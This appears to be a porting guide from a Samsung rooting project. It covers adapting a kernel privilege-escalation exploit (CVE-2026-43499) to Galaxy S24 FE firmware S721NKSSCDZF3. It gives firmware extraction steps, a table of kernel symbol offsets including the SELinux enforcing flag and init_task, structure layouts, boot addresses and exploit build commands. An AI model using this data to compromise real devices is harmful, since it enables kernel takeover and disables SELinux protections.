# Firmware-to-profile porting procedure

This document records the exact procedure used for the Galaxy S24 FE Korean
firmware `S721NKSSCDZF3`. Do not reuse its values for another build. The
separate Galaxy S24 `S921BXXSFDZF2` record, including every changed offset and
firmware hash, is in
[`SM-S921B-S921BXXSFDZF2.md`](SM-S921B-S921BXXSFDZF2.md).
That model uses Exynos 2400 and is not a reference for the Snapdragon E3Q
kernel. The independent SM-S928U/SM-S928U1 Qualcomm DZF2 procedure and
completed offline-gate status are recorded in
[`SM-S928U1-S928U1UES6DZF2.md`](SM-S928U1-S928U1UES6DZF2.md).
The no-BTF Android 5.10 procedure and legacy `rt_mutex_waiter` layout are
recorded separately in
[`SM-A155N-A155NKSS6BYH1.md`](SM-A155N-A155NKSS6BYH1.md).

## 1. Identify the exact firmware

Target identity:

```text
model: SM-S721N
region: LUC
AP/PDA: S721NKSSCDZF3
CSC: S721NOKRCDZF3
CP: S721NKSSCDZE1
display build: BP4A.251205.006.S721NKSSCDZF3
fingerprint: samsung/r12sksx/essi:16/BP4A.251205.006/S721NKSSCDZF3:user/release-keys
kernel release: 6.1.157-android14-11
```

Query Samsung FUS with `samloader-rs`:

```powershell
samloader.exe check-update --model SM-S721N --region LUC --all --verbose
```

The returned four-part version for this port was:

```text
S721NKSSCDZF3/S721NOKRCDZF3/S721NKSSCDZE1/S721NKSSCDZF3
```

Download that exact version:

```powershell
samloader.exe download `
  --model SM-S721N `
  --region LUC `
  --version "S721NKSSCDZF3/S721NOKRCDZF3/S721NKSSCDZE1/S721NKSSCDZF3" `
  --threads 16 `
  --out-file S721NKSSCDZF3_LUC.zip `
  --verbose
```

## 2. Extract the kernel and firmware identity

Extract the AP archive, then `boot.img.lz4`:

```powershell
tar -xf S721NKSSCDZF3_LUC.zip AP_S721NKSSCDZF3_S721NKSSCDZF3_MQB110690303_REV00_user_low_ship_MULTI_CERT_meta_OS16.tar.md5
tar -xf AP_S721NKSSCDZF3_S721NKSSCDZF3_MQB110690303_REV00_user_low_ship_MULTI_CERT_meta_OS16.tar.md5 boot.img.lz4 vendor_boot.img.lz4
```

Decompress Samsung LZ4 images. The Android boot image is header version 4,
page-aligned at 4096 bytes. Read `kernel_size` as little-endian `u32` at boot
header offset `0x08`, then copy that many bytes starting at offset `0x1000`:

```python
from pathlib import Path
import lz4.frame
import struct

compressed = Path("boot.img.lz4").read_bytes()
boot = lz4.frame.decompress(compressed)
Path("boot.img").write_bytes(boot)

kernel_size = struct.unpack_from("<I", boot, 0x08)[0]
Path("kernel").write_bytes(boot[0x1000:0x1000 + kernel_size])
```

For this firmware:

```text
boot.img size: 67108864
boot.img SHA-256: 1E28BA152BC32AC1CECAF356479D97E3BE0D3B3140BEF79D1E5CCF110111AA62
kernel size: 38832640
kernel SHA-256: 849AB87AC89552DC9624647B953491B35060517B05A68DBCBB0E76A02E59B30A
ARM64 Image text_offset: 0x0
ARM64 Image size: 0x27c0000
ARM64 Image flags: 0xa
```

Extract `meta-data/fota.zip` from the firmware ZIP and read the contained
properties. Use `ro.build.display.id`, `ro.build.fingerprint`, model, SDK, ABI,
and page size as the feed identity. Do not derive the profile from the baseband
or AP string alone.

## 3. Recover symbols and BTF

Recover a symbolized ELF from the raw ARM64 Image with
`vmlinux-to-elf`, then list symbols with `llvm-nm`:

```sh
vmlinux-to-elf kernel vmlinux.elf
llvm-nm --numeric-sort vmlinux.elf > vmlinux.nm
```

This kernel contains raw BTF at file interval
`[0x188B1A8, 0x1E423C8)`. Save that interval as `vmlinux.btf`, then dump C
layouts:

```sh
bpftool btf dump file vmlinux.btf format c > vmlinux-btf.h
```

The recovered ELF base for this 6.1 image is `0xffffffc008000000`.

Required S24 FE symbol offsets from that base:

| Macro/use | Symbol or derivation | Offset |
| --- | --- | ---: |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | `call_usermodehelper_exec_work` | `0x000d4468` |
| `NOOP_LLSEEK_OFF` | `noop_llseek` | `0x003a1414` |
| `COPY_SPLICE_READ_OFF` | `generic_file_splice_read` | `0x003ef02c` |
| `CONFIGFS_READ_ITER_OFF` | `configfs_read_iter` | `0x00470d44` |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | `configfs_bin_write_iter` | `0x00471274` |
| `ASHMEM_IOCTL_OFF` | `ashmem_ioctl` | `0x00d37cf8` |
| `ASHMEM_COMPAT_IOCTL_OFF` | `compat_ashmem_ioctl` | `0x00d38630` |
| `ASHMEM_MMAP_OFF` | `ashmem_mmap` | `0x00d38688` |
| `ASHMEM_OPEN_OFF` | `ashmem_open` | `0x00d388b4` |
| `ASHMEM_RELEASE_OFF` | `ashmem_release` | `0x00d3893c` |
| `ASHMEM_SHOW_FDINFO_OFF` | `ashmem_show_fdinfo` | `0x00d38a5c` |
| `ANON_PIPE_BUF_OPS_OFF` | `anon_pipe_buf_ops` | `0x0121dbd0` |
| `ASHMEM_FOPS_OFF` | `ashmem_fops` | `0x013d9d48` |
| `KMALLOC_CACHES_OFF` | `kmalloc_caches` | `0x017a7a18` |
| `SYSTEM_UNBOUND_WQ_OFF` | `system_unbound_wq` | `0x022eae58` |
| logger array | `loggers` | `0x022f2950` |
| `SLIDE_LOGGERS_0_1_OFF` | first qword of `nfulnl_logger` object | `0x022f2a08` |
| `INIT_TASK_OFF` | `init_task` | `0x022ff800` |
| `ASHMEM_MISC_FOPS_OFF` | `ashmem_misc + offsetof(miscdevice, fops)` | `0x02484970` |
| `ROOT_TASK_GROUP_OFF` | `root_task_group` | `0x02515cc0` |
| `SELINUX_ENFORCING_OFF` | `selinux_state.enforcing` | `0x025ea478` |
| boot-id pointer | unique qword to boot-id data | `0x0243ef78` |
| `SLIDE_SYSCTL_BOOTID_OFF` | `sysctl_bootid` | `0x026d1b60` |

`ASHMEM_MISC_FOPS_OFF` is not a symbol. The symbolized ELF exposes
`ashmem_misc`; BTF gives `offsetof(struct miscdevice, fops) == 0x10`, so the
final offset is `ashmem_misc + 0x10`.

Required layout values must come from the target BTF, not another device. The
S24 FE values include:

```text
sizeof(struct file_operations) = 0x110
file_operations.unlocked_ioctl = 0x50
file_operations.compat_ioctl = 0x58
file_operations.mmap = 0x60
file_operations.open = 0x70
file_operations.release = 0x80
file_operations.splice_read = 0xc8
file_operations.show_fdinfo = 0xe0

task_struct.usage = 0x40
task_struct.prio = 0x84
task_struct.normal_prio = 0x8c
task_struct.sched_task_group = 0x348
task_struct.pi_lock = 0x924
task_struct.pi_waiters = 0x938
task_struct.pi_top_task = 0x948
task_struct.pi_blocked_on = 0x950

sizeof(struct page) = 0x40
page.compound_head = 0x08
page.slab_cache = 0x18
page.page_type = 0x30
```

## 4. Confirm physical load addresses

Do not copy the S25U `P0_KERNEL_PHYS_LOAD` value. Extract the BL archive and
decompress `sboot.bin.lz4`. In this firmware, the branch immediately preceding
the `Starting kernel...` path loads the ARM64 Image `text_offset`, adds
`0x80000000`, and branches to the result. Because this Image has
`text_offset == 0`, the exact values are:

```c
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
```

The relevant sboot sequence is at file offset `0x24987c`:

```text
adrp x8, 0x6a6000
ldr  w8, [x8, #0xd08]
mov  w9, #-0x80000000
add  x19, x8, x9
...
blr  x19
```

## 5. Derive slide data and P0 fingerprints

The target trace worker callsite is `0x000dbd9c`. The Android 6.1 trace enum
ends at 20, and `sched_blocked_reason` is the 86th registered event after that
base, producing runtime event ID `106`.

The pselect syscall stack shape was disassembled on both target kernels; the
S24 FE needs no extra word shift:

```c
#define SLIDE_TRACEFS_EVENT_ID 106
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbd9cULL
#define SLIDE_PSELECT_WORD_SHIFT 0
```

Generate every P0 row from the target raw kernel. For each candidate slide
`0x000000` through `0x1f0000` in steps of `0x10000`, record the eight little-
endian qwords at page offsets `0x000, 0x200, ..., 0xe00`. Verify the generated
table by reading all 256 source qwords back from the raw Image. The checked-in
table is `src/targets/essi-S721NKSSCDZF3/p0_fingerprint.h`.

## 6. Add and build a target

Create:

```text
src/targets/<device>-<build>/target.h
src/targets/<device>-<build>/p0_fingerprint.h
```

All firmware-dependent constants belong in that directory. Shared exploit
code selects it through `TARGET_HEADER`; do not add another device's offsets to
the default header.

Build and enforce the fixed release payload size:

```sh
make TARGET=essi-S721NKSSCDZF3 \
  ANDROID_NDK_HOME=/path/to/android-ndk-r29 release
```

The output must be copied to:

```text
artifacts/essi-S721NKSSCDZF3/cve-2026-43499-app.so
```

## 7. Build the matching KernelSU module

Follow [`../kernelsu/README.md`](../kernelsu/README.md). In addition to a clean
module build, perform all of these checks:

1. apply the Samsung patch cleanly to KernelSU v3.2.5;
2. run `check_symbol` against the recovered target `vmlinux.elf`, not only the
   DDK vmlinux;
3. inspect the target kernel configuration for `CONFIG_MODULE_FORCE_LOAD` and
   `CONFIG_MODVERSIONS`;
4. make `modinfo` report the exact target `vermagic`;
5. strip debug sections, embed the resulting KO as the exact KMI asset (for
   example, `android14-6.1_kernelsu.ko` or
   `android12-5.10_kernelsu.ko`), and rebuild `ksud`;
6. name both published files with their kernel/KMI version.

For this target, the embedded and standalone KO reports:

```text
6.1.157-android14-11 SMP preempt mod_unload modversions aarch64
```

For a no-BTF Samsung 5.10 target with `CONFIG_TRIM_UNUSED_KSYMS=y`, follow the
A155N procedure in [`SM-A155N-A155NKSS6BYH1.md`](SM-A155N-A155NKSS6BYH1.md).
Build with `KBUILD_MODPOST_WARN=1`, keep `.symtab` and `.strtab`, and require a
zero-length `__versions` section so KernelSU's late loader can relocate every
undefined symbol from `/proc/kallsyms`. Do not copy a `Module.symvers` from a
different GKI build.

`kernelsu/tools/extract_target_symvers.py` can recover the exact exported
symbol CRC table from a reconstructed little-endian ARM64 `vmlinux`. Use it to
audit export order and CRCs or to prepare a conventional exported-symbol-only
module. It is not a substitute for the manual-relocation build when KernelSU
depends on symbols trimmed from the target export table.

## 8. Publish the support feed

Add an exact entry to `support/targets-v2.json`, including the target's literal
`uname -r` value as `kernelRelease` and complete `/proc/version` string as
`kernelVersion`. Do not invent a suffix when a vendor kernel exposes a short
release string. Update artifact sizes, validate the final JSON, and confirm that
Root My Galaxy can parse the profile before publishing it.

## 9. Cleanup policy

After the profile, documentation, and builds have been verified:

1. retain the raw `kernel` file and a provenance note containing its exact
   firmware identity, size, and SHA-256;
2. remove the downloaded multi-gigabyte firmware ZIP, AP/BL archives, boot and
   vendor images, recovered ELF, and temporary BTF dump;
3. keep the generated target headers, release payload, versioned KO, late-load
   binary, and source patch under version control.

Hardware execution remains a separate validation step. The S24 FE profile in
this repository has not been executed on an `SM-S721N` device.
